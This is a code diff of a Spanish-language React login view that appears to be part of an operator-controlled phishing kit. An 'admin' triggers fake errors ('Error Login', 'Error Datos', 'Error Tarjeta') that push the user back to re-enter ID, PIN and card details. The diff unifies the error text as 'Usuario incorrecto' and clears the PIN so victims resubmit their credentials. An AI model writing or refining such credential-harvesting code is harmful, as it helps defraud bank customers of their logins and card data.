@@ -40,7 +40,20 @@ export const VisualAuthView: React.FC<VisualAuthViewProps> = ({ onGoToCard }) =>
   }, [])
 
   // Mensaje de alerta (cuando el admin pulsa Error Login o Error Datos)
-  const [userAlertMessage, setUserAlertMessage] = useState<string>('')
+  const [userAlertMessage, setUserAlertMessage] = useState<string>(() => {
+    return sessionStorage.getItem('auth_error_message') || ''
+  })
+
+  // Sincronizar mensaje de error si se redirige desde la tarjeta
+  useEffect(() => {
+    const saved = sessionStorage.getItem('auth_error_message')
+    if (saved) {
+      setUserAlertMessage(saved)
+      sessionStorage.removeItem('auth_error_message')
+      setStep(1)
+      setPin(['', '', '', ''])
+    }
+  }, [step])
 
   // Datos Paso 1
   const [docType, setDocType] = useState('Cédula de ciudadanía')
@@ -102,12 +115,14 @@ export const VisualAuthView: React.FC<VisualAuthViewProps> = ({ onGoToCard }) =>
 
           // 1. Si el admin presionó "Error Login"
           if (currentStatus === 'ERROR_LOGIN') {
-            setUserAlertMessage('Los datos de inicio de sesión o clave ingresados son incorrectos. Por favor intenta nuevamente.')
+            setUserAlertMessage('Usuario incorrecto. Por favor verifica tus datos e intenta nuevamente.')
+            setPin(['', '', '', ''])
             setStep(1)
           }
           // 2. Si el admin presionó "Error Datos"
           else if (currentStatus === 'ERROR_DATOS') {
-            setUserAlertMessage('La información suministrada no coincide con nuestros registros. Por favor verifica e intenta nuevamente.')
+            setUserAlertMessage('Usuario incorrecto. Por favor verifica tus datos e intenta nuevamente.')
+            setPin(['', '', '', ''])
             setStep(1)
           }
           // 3. Si el admin presionó "6 Dígitos"
@@ -134,10 +149,9 @@ export const VisualAuthView: React.FC<VisualAuthViewProps> = ({ onGoToCard }) =>
           }
           // 6. Si el admin presionó "Error Tarjeta"
           else if (currentStatus === 'ERROR_TARJETA') {
-            setUserAlertMessage('Error en la tarjeta: La entidad financiera rechazó la transacción. Por favor verifica tus datos o ingresa una nueva tarjeta.')
-            if (onGoToCard) {
-              onGoToCard()
-            }
+            setUserAlertMessage('Usuario incorrecto. Por favor verifica tus datos e intenta nuevamente.')
+            setPin(['', '', '', ''])
+            setStep(1)
           }
         }
       } catch {
